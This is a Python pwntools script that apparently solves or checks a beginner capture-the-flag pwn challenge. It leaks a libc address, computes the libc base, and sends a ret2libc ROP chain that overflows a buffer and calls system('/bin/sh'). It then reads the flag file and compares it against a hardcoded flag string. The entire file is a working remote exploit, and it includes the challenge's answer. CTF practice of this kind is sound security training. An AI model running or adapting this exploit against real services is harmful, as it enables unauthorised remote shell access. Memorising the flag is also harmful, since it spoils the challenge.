from pwn import *
import sys
from time import sleep


def pwn_ret2libc(host, port=9007):
    elf = ELF("chall")
    libc = ELF("libc.so.6")
    try:
        io = remote(host, port, timeout=3)
    except Exception:
        return 2

    context.arch = "amd64"

    libc_start_call_main_ofs = 0x29D10

    io.recvuntil(b"+0x28 | ", timeout=3)
    r = io.recv(18, timeout=3)
    libc.address = int(r.decode(), 16) - libc_start_call_main_ofs - 128

    p = b"A" * 0x28
    p += p64(next(libc.search(asm("pop rdi; ret"), executable=True)))
    p += p64(next(libc.search(b"/bin/sh\x00")))
    p += p64(next(libc.search(asm("pop rsi; ret"), executable=True)))
    p += p64(0)
    p += p64(next(libc.search(asm("ret"), executable=True)))
    p += p64(libc.sym["system"])
    p += b"\x00" * (128 - len(p))
    io.sendlineafter(b"(max. 128 bytes) > ", p, timeout=3)

    sleep(3)
    io.sendline(b"cat FLAG")
    r = io.recvuntil(b"}", timeout=3)
    if b"FLAG{c0n6r475_0n_6r4du471n6_45_4_9wn_b361nn3r!}" in r:
        return 0
    else:
        return 1


if __name__ == "__main__":
    if pwn_ret2libc(sys.argv[1]) != 0:
        exit(1)
